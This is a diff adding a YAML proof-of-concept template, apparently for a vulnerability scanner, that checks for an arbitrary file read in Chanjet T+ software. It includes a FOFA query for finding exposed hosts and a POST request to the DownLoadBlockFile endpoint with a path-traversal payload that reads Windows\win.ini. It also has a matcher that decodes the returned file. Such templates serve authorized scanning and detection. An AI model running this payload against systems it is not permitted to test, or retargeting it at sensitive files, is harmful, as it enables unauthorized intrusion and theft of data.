@@ -1,0 +1,20 @@
+id: poc-yaml-changjie-t-plus-downloadblockfile-anyfile-read
+info:
+  name: 畅捷通T+ DownLoadBlockFile 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 畅捷通T+
+  fofa: app="畅捷通-TPlus"
+requests:
+- method: POST
+  path: /tplus/GLSyncService.asmx/DownLoadBlockFile
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: fileName=..%2F..%2F..%2FWindows%2Fwin.ini
+  expression: status_code == 200 && contains(base64_decode(regex_find(body,`>([A-Za-z0-9+/]+={0,2})</base64Binary>`)),"bit
+    app support") && contains(base64_decode(regex_find(body,`>([A-Za-z0-9+/]+={0,2})</base64Binary>`)),"[fonts]")
+    && contains(base64_decode(regex_find(body,`>([A-Za-z0-9+/]+={0,2})</base64Binary>`)),"[files]")
+    && contains(content_type,"text/xml")
+variables: {}
+transport: http
